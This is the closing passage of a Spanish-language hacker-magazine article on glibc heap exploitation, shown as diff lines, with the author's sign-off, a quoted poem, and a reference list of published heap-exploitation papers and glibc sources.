+estan por descubrir. Te animas por casualidad a ser el siguiente?
+
+Esta es tu casa!
+
+
+Un abrazo!
+blackngel
+
+
+
+                         "Adormecida, ella yace
+                          con los ojos abiertos
+                como la ascension del Angel hacia arriba
+                    Sus bellos ojos de disuelto azul
+                que responden ahora: "lo hare, lo hago!
+                la pregunta realizada hace tanto tiempo.
+
+                         Aunque ella debe gritar
+                              no lo parece
+                  lo que pronuncia es mas que un grito
+                     Yo se que el Angel debe llegar
+               para besarme suavemente, como mi estimulo
+                la aguja profunda penetra en sus ojos."
+
+              * Versos 4 y 5 de "El beso del Angel Negro" 
+ 
+
+
+           ----------------
+---[ 7 ---[   REFERENCES   ]---
+           ----------------
+
+[1] Vudo - An object superstitiously believed to embody magical powers
+    http://www.phrack.org/issues.html?issue=57&id=8#article
+
+[2] Once upon a free()
+    http://www.phrack.org/issues.html?issue=57&id=9#article
+
+[3] Advanced Doug Lea's malloc exploits
+    http://www.phrack.org/issues.html?issue=61&id=6#article
+
+[4] Malloc Maleficarum
+    http://seclists.org/bugtraq/2005/Oct/0118.html    
+
+[5] Exploiting the Wilderness
+    http://seclists.org/vuln-dev/2004/Feb/0025.html
+
+[6] The House of Mind
+    http://www.awarenetwork.org/etc/alpha/?x=4
+
+[7] The use of set_head to defeat the wilderness
+    http://www.phrack.org/issues.html?issue=64&id=9#article
+
+[8] GLIBC 2.3.6
+    http://ftp.gnu.org/gnu/glibc/glibc-2.3.6.tar.bz2
+
+[9] PTMALLOC of Wolfram Gloger
+    http://www.malloc.de/en/
+
+[10] The art of Exploitation: Come back on an exploit
+     http://www.phrack.org/issues.html?issue=64&id=15#article
+
+[11] Bypassing PaX ASLR protection
+     http://www.phrack.org/issues.html?issue=59&id=9#article
+
+
+*EOF*
